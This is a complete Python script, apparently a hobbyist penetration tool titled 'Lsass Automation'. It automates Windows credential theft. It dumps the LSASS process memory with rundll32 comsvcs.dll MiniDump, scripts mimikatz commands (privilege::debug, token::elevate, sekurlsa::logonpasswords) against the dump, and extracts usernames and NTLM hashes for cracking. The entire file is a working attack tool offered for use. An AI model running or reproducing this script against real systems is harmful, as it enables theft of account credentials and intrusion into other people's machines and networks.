import os
import subprocess
import sys
import wexpect
import time
import platform
import threading



def logBanner():
    banner =r"""
$$$$$$$$\                      $$\     $$\           
$$  _____|                     $$ |    \__|          
$$ |      $$\   $$\  $$$$$$\ $$$$$$\   $$\  $$$$$$$\ 
$$$$$\    \$$\ $$  |$$  __$$\\_$$  _|  $$ |$$  _____|
$$  __|    \$$$$  / $$ /  $$ | $$ |    $$ |$$ /      
$$ |       $$  $$<  $$ |  $$ | $$ |$$\ $$ |$$ |      
$$$$$$$$\ $$  /\$$\ \$$$$$$  | \$$$$  |$$ |\$$$$$$$\ 
\________|\__/  \__| \______/   \____/ \__| \_______|
                                                     
Lsass Automation! Made by Exotic!! v1.3                                                     
                                                     
"""
    return banner 

def load_animation():
    global status
    status = False
    while status == False:
        sys.stdout.write('\rloading |')
        time.sleep(0.1)
        sys.stdout.write('\rloading /')
        time.sleep(0.1)
        sys.stdout.write('\rloading -')
        time.sleep(0.1)
        sys.stdout.write('\rloading \\')
        time.sleep(0.1)
        if status == True:
            sys.stdout.write('\rDone!     ')
            print("\n")
            break
    

def is_windows():
    return platform.system() == 'Windows'

def is_admin():
    check_admin = subprocess.run('net session' ,shell = True, text = True, capture_output = True)
    if 'Access is denied' in check_admin.stderr:
        return False
    else:
        return True


def lsass_extract(current_dir):
    print("[+] Starting Dumping lsass process")
    print("[*] Looking for the lsass Process")
    lsass_pid = int(subprocess.run('powershell.exe (Get-Process lsass).Id' ,shell = True, text = True, capture_output = True).stdout)
    print("[*] Executing Dumping for the lsass Process to current directory")
    try:
        os.chdir('c:\\windows\\system32')
        subprocess.run(f'.\\rundll32.exe comsvcs.dll, MiniDump {lsass_pid} {current_dir}\\lsass.dmp full' ,shell = True)
    except Exception as e:
        print("[-] Something went wrong.. ",e)
        exit(0)

    os.chdir(current_dir)
    if 'lsass.dmp' in os.listdir():
        print("[+] Lsass was successfuly dumped!")
    else:
        print("[-] Something went wrong... try running as Administrator again")
        exit(0)

def mimikatz_dumping(lsass_path, current_dir):
    try:
        print("[*] Starting Mimikatz BE PATIENT!")
        t = threading.Thread(target = load_animation)
        t.start()
        child = wexpect.spawn('mimikatz.exe')
        child.expect('#')
        child.sendline('log MimiDump.txt')
        child.expect('#')
        child.sendline('privilege::debug')
        child.expect('#')
        child.sendline('token::elevate')
        child.expect('#')
        child.sendline(f'sekurlsa::minidump {lsass_path}')
        child.expect("#")
        child.sendline('sekurlsa::logonpasswords')
        child.expect("#")
        child.sendline("exit")
        global status
        status = True
        t.join()
        time.sleep(1.5)
        os.system(f'powershell mv -Force MimiDump.txt {current_dir}')
        print('[+] MimiDump.txt file was created successfuly to crack the NTLM Hash!')
    except Exception as e:
        print('[-] Something went Wrong: ',e)

def mimi_examine():
    try:
        with open('MimiDump.txt', 'r') as mimi_dump:
            mimi_file = [line.strip('\r').strip('\n').replace(' ', '').replace('\t', '') for line in mimi_dump.readlines()]
        cred_list = list()
        for i in range(len(mimi_file)):
            if mimi_file[i].startswith('*Username:'):
                if mimi_file[i + 2].startswith('*NTLM:'):
                    if not (mimi_file[i].strip("*") in cred_list):
                        cred_list.append(mimi_file[i].lstrip('*'))
                        cred_list.append(mimi_file[i + 2].lstrip('*'))
        if len(cred_list) > 0:
            print("[+] Found Credential!\n")
            return cred_list
        else:
            print("[?] No Credentials found!")
            return
    except Exception as e:
        print("[-] Something went wrong.. ",e)
        exit(0)

def main():
    os.system('cls')
    print(logBanner())
    if not is_windows():
        print("[-] You need to run the script in windows OS")
        print("[-] Exiting...")
        exit(0)
    current_dir = os.getcwd()
    if not is_admin():
        print("[-] You need to run the script as Administrator")
        print("[-] Exiting...")
        exit(0)
    user_input = input('[?] Do you have lsass.dmp (Y/N)? ')
    if user_input.lower() == 'n':
        lsass_extract(current_dir)
        lsass_path = os.getcwd() + '\lsass.dmp'
    
    elif user_input.lower() == 'y':
            lsass_path = input('Enter the full lsass.dmp path: ')
        
    else:
        print('[-] You have to enter Y/N ONLY!')
        exit(0)
    
    mimi_path = input("Enter the mimikatz path: ")
    os.chdir(mimi_path)
    mimikatz_dumping(lsass_path, current_dir)
    os.chdir(current_dir)
    cred_file = mimi_examine()
    if not(cred_file == None):
        for cred in cred_file:
            if cred.startswith('Username:'):
                print('\n')
            print(cred)
        print('\n')

if __name__ == "__main__":
    main()
